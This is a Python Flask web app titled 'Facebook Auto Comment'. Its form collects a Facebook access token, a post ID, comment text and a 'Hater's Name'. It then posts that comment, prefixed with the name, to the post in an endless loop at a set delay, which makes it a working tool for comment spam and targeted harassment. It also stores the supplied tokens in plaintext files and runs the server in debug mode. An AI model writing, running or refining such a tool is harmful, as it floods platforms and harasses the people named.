from flask import Flask, request, render_template_string, jsonify
import os
import threading
import time
import requests

app = Flask(__name__)

# Storage Directory
DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
POST_FILE = os.path.join(DATA_DIR, "post_url.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comment.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")
HATERS_FILE = os.path.join(DATA_DIR, "haters_name.txt")

# HTML Form
HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Auto Comment</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px; text-align: center; }
        .container { max-width: 400px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0px 0px 10px gray; }
        input, button { width: 100%%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { background-color: brown; color: white; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="color: brown;">Created by Raghu ACC Rullx Boy</h2>
        <form action="/submit" method="post">
            <input type="text" name="token" placeholder="Facebook Token" required>
            <input type="text" name="post_url" placeholder="Facebook Post ID" required>
            <input type="text" name="comment" placeholder="Comment Text" required>
            <input type="text" name="haters_name" placeholder="Hater's Name (Optional)">
            <input type="number" name="delay" placeholder="Delay (Seconds)" value="10" required>
            <button type="submit">Submit</button>
        </form>
    </div>
</body>
</html>
"""

# Save Data to Files
def save_data(token, post_url, comment, delay, haters_name):
    with open(TOKEN_FILE, "w") as f:
        f.write(token.strip())
    with open(POST_FILE, "w") as f:
        f.write(post_url.strip())
    with open(COMMENT_FILE, "w") as f:
        f.write(comment.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))
    with open(HATERS_FILE, "w") as f:
        f.write(haters_name.strip())

# Function to send comments
def send_comments():
    try:
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        with open(POST_FILE, "r") as f:
            post_url = f.read().strip()
        with open(COMMENT_FILE, "r") as f:
            comment = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())
        with open(HATERS_FILE, "r") as f:
            haters_name = f.read().strip()

        if not token or not post_url:
            print("[ERROR] Missing token or post URL.")
            return

        while True:
            message = f"{haters_name} {comment}"
            fb_url = f"https://graph.facebook.com/v15.0/{post_url}/comments"
            payload = {'access_token': token, 'message': message}
            headers = {'User-Agent': 'Mozilla/5.0'}

            response = requests.post(fb_url, json=payload, headers=headers)

            if response.ok:
                print(f"[+] Comment Sent: {message}")
            else:
                print(f"[ERROR] {response.status_code}: {response.text}")

            time.sleep(delay)

    except Exception as e:
        print(f"[ERROR] {e}")

# Route to show the form
@app.route('/')
def index():
    return render_template_string(HTML_FORM)

# Handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    data = request.form
    token = data.get("token")
    post_url = data.get("post_url")
    comment = data.get("comment")
    delay = data.get("delay")
    haters_name = data.get("haters_name", "")

    if not token or not post_url:
        return jsonify({"error": "Token and Post URL are required!"}), 400

    save_data(token, post_url, comment, int(delay), haters_name)

    # Start comment posting in background
    comment_thread = threading.Thread(target=send_comments, daemon=True)
    comment_thread.start()

    return jsonify({"message": "Auto Commenting Started!"})

if __name__ == "__main__":
    app.run(debug=True, port=5000)
